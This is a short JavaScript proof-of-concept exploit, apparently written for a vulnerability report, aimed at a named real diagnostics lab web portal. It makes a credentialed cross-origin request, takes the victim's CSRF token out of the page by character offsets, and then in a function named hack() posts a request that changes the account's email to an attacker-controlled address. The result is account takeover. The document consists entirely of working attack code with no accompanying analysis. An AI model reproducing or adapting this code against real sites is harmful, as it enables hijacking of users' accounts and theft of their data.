var fetchHash = new XMLHttpRequest();

var url = "https://usdiagnostics.roche.com/my-lab-update-email.html";
var datax;
var csrf_token='initial';
fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
                       alert(datax);
                    csrf_token = datax.substring(285,321);
                         alert('I have your csrf token:'+csrf_token);



        }

}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();



function hack()
{

var HackAccount = new XMLHttpRequest();

url= "https://usdiagnostics.roche.com/my-lab-update-email.html";

HackAccount .open("POST",url, true);

HackAccount .withCredentials=true;

var data= 'csrfToken='+csrf_token+'&proceedWithNonwhitelist=true&newEmail=jacob.killer%40mail.com&newEmail2=jacob.killer%40mail.com' ;

HackAccount .setRequestHeader('X-Requested-With','XMLHttpRequest');

HackAccount .setRequestHeader('Content-Type','application/x-www-form-urlencoded');
HackAccount .send(data);


}